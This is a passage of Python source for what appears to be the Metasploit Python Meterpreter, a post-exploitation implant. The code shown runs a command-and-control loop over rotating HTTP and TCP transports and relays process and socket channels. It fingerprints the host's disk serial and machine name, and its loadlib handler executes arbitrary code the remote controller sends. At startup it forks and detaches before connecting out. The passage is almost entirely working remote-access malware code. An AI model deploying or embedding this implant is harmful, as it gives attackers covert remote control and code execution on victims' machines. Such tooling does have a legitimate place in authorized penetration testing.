        if not isinstance(channel, MeterpreterChannel):
            debug_print('[-] channel object is not an instance of MeterpreterChannel')
            raise TypeError('invalid channel object')
        idx = self.next_channel_id
        self.channels[idx] = channel
        debug_print('[*] added channel id: ' + str(idx) + ' type: ' + channel.__class__.__name__)
        self.next_channel_id += 1
        return idx

    def add_process(self, process):
        idx = self.next_process_id
        self.processes[idx] = process
        debug_print('[*] added process id: ' + str(idx))
        self.next_process_id += 1
        return idx

    def get_packet(self):
        pkt = self.transport.get_packet()
        if pkt is None and self.transport.should_retire:
            self.transport_change()
        return pkt

    def send_packet(self, packet):
        send_succeeded = self.transport.send_packet(packet)
        if not send_succeeded and self.transport.should_retire:
            self.transport_change()
        return send_succeeded

    @property
    def session_has_expired(self):
        if self.session_expiry_time == 0:
            return False
        return time.time() > self.session_expiry_end

    def transport_add(self, new_transport):
        new_position = self.transports.index(self.transport)
        self.transports.insert(new_position, new_transport)

    def transport_change(self, new_transport=None):
        if new_transport is None:
            new_transport = self.transport_next()
        self.transport.deactivate()
        debug_print('[*] changing transport to: ' + new_transport.url)
        while not new_transport.activate():
            new_transport = self.transport_next(new_transport)
            debug_print('[*] changing transport to: ' + new_transport.url)
        self.transport = new_transport

    def transport_next(self, current_transport=None):
        if current_transport is None:
            current_transport = self.transport
        new_idx = self.transports.index(current_transport) + 1
        if new_idx == len(self.transports):
            new_idx = 0
        return self.transports[new_idx]

    def transport_prev(self, current_transport=None):
        if current_transport is None:
            current_transport = self.transport
        new_idx = self.transports.index(current_transport) - 1
        if new_idx == -1:
            new_idx = len(self.transports) - 1
        return self.transports[new_idx]

    def run(self):
        while self.running and not self.session_has_expired:
            request = self.get_packet()
            if request:
                response = self.create_response(request)
                if response:
                    self.send_packet(response)
                if self._transport_sleep:
                    self.transport.deactivate()
                    time.sleep(self._transport_sleep)
                    self._transport_sleep = None
                    if not self.transport.activate():
                        self.transport_change()
                    continue
            # iterate over the keys because self.channels could be modified if one is closed
            channel_ids = list(self.channels.keys())
            for channel_id in channel_ids:
                channel = self.channels[channel_id]
                data = bytes()
                write_request_parts = []
                if isinstance(channel, MeterpreterProcess):
                    if not channel_id in self.interact_channels:
                        continue
                    proc_h = channel.proc_h
                    if proc_h.stderr_reader.is_read_ready():
                        data = proc_h.stderr_reader.read()
                    elif proc_h.stdout_reader.is_read_ready():
                        data = proc_h.stdout_reader.read()
                    elif not channel.is_alive():
                        self.handle_dead_resource_channel(channel_id)
                elif isinstance(channel, MeterpreterSocketTCPClient):
                    while select.select([channel.fileno()], [], [], 0)[0]:
                        try:
                            d = channel.read(1)
                        except socket.error:
                            d = bytes()
                        if len(d) == 0:
                            self.handle_dead_resource_channel(channel_id)
                            break
                        data += d
                elif isinstance(channel, MeterpreterSocketTCPServer):
                    if select.select([channel.fileno()], [], [], 0)[0]:
                        (client_sock, client_addr) = channel.sock.accept()
                        server_addr = channel.sock.getsockname()
                        client_channel_id = self.add_channel(MeterpreterSocketTCPClient(client_sock))
                        self.send_packet(tlv_pack_request('tcp_channel_open', [
                            {'type': TLV_TYPE_CHANNEL_ID, 'value': client_channel_id},
                            {'type': TLV_TYPE_CHANNEL_PARENTID, 'value': channel_id},
                            {'type': TLV_TYPE_LOCAL_HOST, 'value': inet_pton(channel.sock.family, server_addr[0])},
                            {'type': TLV_TYPE_LOCAL_PORT, 'value': server_addr[1]},
                            {'type': TLV_TYPE_PEER_HOST, 'value': inet_pton(client_sock.family, client_addr[0])},
                            {'type': TLV_TYPE_PEER_PORT, 'value': client_addr[1]},
                        ]))
                elif isinstance(channel, MeterpreterSocketUDPClient):
                    if select.select([channel.fileno()], [], [], 0)[0]:
                        try:
                            data, peer_address = channel.sock.recvfrom(65535)
                        except socket.error:
                            self.handle_dead_resource_channel(channel_id)
                        else:
                            write_request_parts.extend([
                                {'type': TLV_TYPE_PEER_HOST, 'value': peer_address[0]},
                                {'type': TLV_TYPE_PEER_PORT, 'value': peer_address[1]},
                            ])
                if data:
                    write_request_parts.extend([
                        {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
                        {'type': TLV_TYPE_CHANNEL_DATA, 'value': data},
                        {'type': TLV_TYPE_LENGTH, 'value': len(data)},
                    ])
                    self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))

    def handle_dead_resource_channel(self, channel_id):
        del self.channels[channel_id]
        if channel_id in self.interact_channels:
            self.interact_channels.remove(channel_id)
        self.send_packet(tlv_pack_request('core_channel_close', [
            {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
        ]))

    def _core_set_uuid(self, request, response):
        new_uuid = packet_get_tlv(request, TLV_TYPE_UUID)
        if new_uuid:
            PAYLOAD_UUID = binascii.b2a_hex(new_uuid['value'])
        return ERROR_SUCCESS, response

    def _core_enumextcmd(self, request, response):
        extension_name = packet_get_tlv(request, TLV_TYPE_STRING)['value']
        for func_name in self.extension_functions.keys():
            if func_name.split('_', 1)[0] == extension_name:
                response += tlv_pack(TLV_TYPE_STRING, func_name)
        return ERROR_SUCCESS, response

    def _core_get_session_guid(self, request, response):
        response += tlv_pack(TLV_TYPE_SESSION_GUID, binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')))
        return ERROR_SUCCESS, response

    def _core_set_session_guid(self, request, response):
        new_guid = packet_get_tlv(request, TLV_TYPE_SESSION_GUID)
        if new_guid:
            SESSION_GUID = binascii.b2a_hex(new_guid['value'])
        return ERROR_SUCCESS, response

    def _core_machine_id(self, request, response):
        serial = ''
        machine_name = platform.uname()[1]
        if has_windll:
            from ctypes import wintypes

            k32 = ctypes.windll.kernel32
            sys_dir = ctypes.create_unicode_buffer(260)
            if not k32.GetSystemDirectoryW(ctypes.byref(sys_dir), 260):
                return ERROR_FAILURE_WINDOWS

            vol_buf = ctypes.create_unicode_buffer(260)
            fs_buf = ctypes.create_unicode_buffer(260)
            serial_num = wintypes.DWORD(0)

            if not k32.GetVolumeInformationW(ctypes.c_wchar_p(sys_dir.value[:3]),
                    vol_buf, ctypes.sizeof(vol_buf), ctypes.byref(serial_num), None,
                    None, fs_buf, ctypes.sizeof(fs_buf)):
                return ERROR_FAILURE_WINDOWS
            serial_num = serial_num.value
            serial = "%04x" % ((serial_num >> 16) & 0xffff) + '-' "%04x" % (serial_num & 0xffff)
        else:
            serial = get_hdd_label()

        response += tlv_pack(TLV_TYPE_MACHINE_ID, "%s:%s" % (serial, machine_name))
        return ERROR_SUCCESS, response

    def _core_native_arch(self, request, response):
        response += tlv_pack(TLV_TYPE_STRING, get_native_arch())
        return ERROR_SUCCESS, response

    def _core_patch_url(self, request, response):
        if not isinstance(self.transport, HttpTransport):
            return ERROR_FAILURE, response
        new_uri_path = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
        if not self.transport.patch_uri_path(new_uri_path):
            return ERROR_FAILURE, response
        return ERROR_SUCCESS, response

    def _core_loadlib(self, request, response):
        data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
        if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
            return ERROR_FAILURE, response

        self.last_registered_extension = None
        symbols_for_extensions = {'meterpreter':self}
        symbols_for_extensions.update(EXPORTED_SYMBOLS)
        i = code.InteractiveInterpreter(symbols_for_extensions)
        i.runcode(compile(data_tlv['value'], '', 'exec'))
        extension_name = self.last_registered_extension

        if extension_name:
            check_extension = lambda x: x.startswith(extension_name)
            lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
            for method in lib_methods:
                response += tlv_pack(TLV_TYPE_METHOD, method)
        return ERROR_SUCCESS, response

    def _core_shutdown(self, request, response):
        response += tlv_pack(TLV_TYPE_BOOL, True)
        self.running = False
        return ERROR_SUCCESS, response

    def _core_transport_add(self, request, response):
        new_transport = Transport.from_request(request)
        self.transport_add(new_transport)
        return ERROR_SUCCESS, response

    def _core_transport_change(self, request, response):
        new_transport = Transport.from_request(request)
        self.transport_add(new_transport)
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        self.transport_change(new_transport)
        return None

    def _core_transport_list(self, request, response):
        if self.session_expiry_time > 0:
            response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
        response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())

        transport = self.transport_next()
        while transport != self.transport:
            response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
            transport = self.transport_next(transport)
        return ERROR_SUCCESS, response

    def _core_transport_next(self, request, response):
        new_transport = self.transport_next()
        if new_transport == self.transport:
            return ERROR_FAILURE, response
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        self.transport_change(new_transport)
        return None

    def _core_transport_prev(self, request, response):
        new_transport = self.transport_prev()
        if new_transport == self.transport:
            return ERROR_FAILURE, response
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        self.transport_change(new_transport)
        return None

    def _core_transport_remove(self, request, response):
        url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
        if self.transport.url == url:
            return ERROR_FAILURE, response
        transport_found = False
        for transport in self.transports:
            if transport.url == url:
                transport_found = True
                break
        if transport_found:
            self.transports.remove(transport)
            return ERROR_SUCCESS, response
        return ERROR_FAILURE, response

    def _core_transport_set_timeouts(self, request, response):
        timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
        if not timeout_value is None:
            self.session_expiry_time = timeout_value
            self.session_expiry_end = time.time() + self.session_expiry_time
        timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
        if timeout_value:
            self.transport.communication_timeout = timeout_value
        retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value')
        if retry_value:
            self.transport.retry_total = retry_value
        retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value')
        if retry_value:
            self.transport.retry_wait = retry_value

        if self.session_expiry_time > 0:
            response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
        response += self.transport.tlv_pack_timeouts()
        return ERROR_SUCCESS, response

    def _core_transport_sleep(self, request, response):
        seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        if seconds:
            self._transport_sleep = seconds
        return ERROR_SUCCESS, response

    def _core_channel_open(self, request, response):
        channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
        handler = 'channel_open_' + channel_type['value']
        if handler not in self.extension_functions:
            debug_print('[-] core_channel_open missing handler: ' + handler)
            return error_result(NotImplementedError), response
        debug_print('[*] core_channel_open dispatching to handler: ' + handler)
        handler = self.extension_functions[handler]
        return handler(request, response)

    def _core_channel_close(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status, response = channel.core_close(request, response)
        if status == ERROR_SUCCESS:
            del self.channels[channel_id]
            if channel_id in self.interact_channels:
                self.interact_channels.remove(channel_id)
            debug_print('[*] closed and removed channel id: ' + str(channel_id))
        return status, response

    def _core_channel_eof(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status, response = channel.core_eof(request, response)
        return ERROR_SUCCESS, response


    def _core_channel_interact(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        toggle = packet_get_tlv(request, TLV_TYPE_BOOL)['value']
        if toggle:
            if channel_id in self.interact_channels:
                self.interact_channels.remove(channel_id)
            else:
                self.interact_channels.append(channel_id)
        elif channel_id in self.interact_channels:
            self.interact_channels.remove(channel_id)
        return ERROR_SUCCESS, response

    def _core_channel_read(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status, response = channel.core_read(request, response)
        if not channel.is_alive():
            self.handle_dead_resource_channel(channel_id)
        return status, response

    def _core_channel_write(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status = ERROR_FAILURE
        if channel.is_alive():
            status, response = channel.core_write(request, response)
        # evaluate channel.is_alive() twice because it could have changed
        if not channel.is_alive():
            self.handle_dead_resource_channel(channel_id)
        return status, response

    def create_response(self, request):
        response = struct.pack('>I', PACKET_TYPE_RESPONSE)
        method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
        response += tlv_pack(method_tlv)
        response += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))

        handler_name = method_tlv['value']
        if handler_name in self.extension_functions:
            handler = self.extension_functions[handler_name]
            try:
                debug_print('[*] running method ' + handler_name)
                result = handler(request, response)
                if result is None:
                    return
                result, response = result
            except Exception:
                debug_traceback('[-] method ' + handler_name + ' resulted in an error')
                result = error_result()
            else:
                if result != ERROR_SUCCESS:
                    debug_print('[-] method ' + handler_name + ' resulted in error: #' + str(result))
        else:
            debug_print('[-] method ' + handler_name + ' was requested but does not exist')
            result = error_result(NotImplementedError)

        reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
        if not reqid_tlv:
            return
        response += tlv_pack(reqid_tlv)
        return response + tlv_pack(TLV_TYPE_RESULT, result)

_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
if not _try_to_fork or (_try_to_fork and os.fork() == 0):
    if hasattr(os, 'setsid'):
        try:
            os.setsid()
        except OSError:
            pass
    if HTTP_CONNECTION_URL and has_urllib:
        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
    else:
        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
        transport = TcpTransport.from_socket(s)
    met = PythonMeterpreter(transport)
    # PATCH-SETUP-TRANSPORTS #
    met.run()
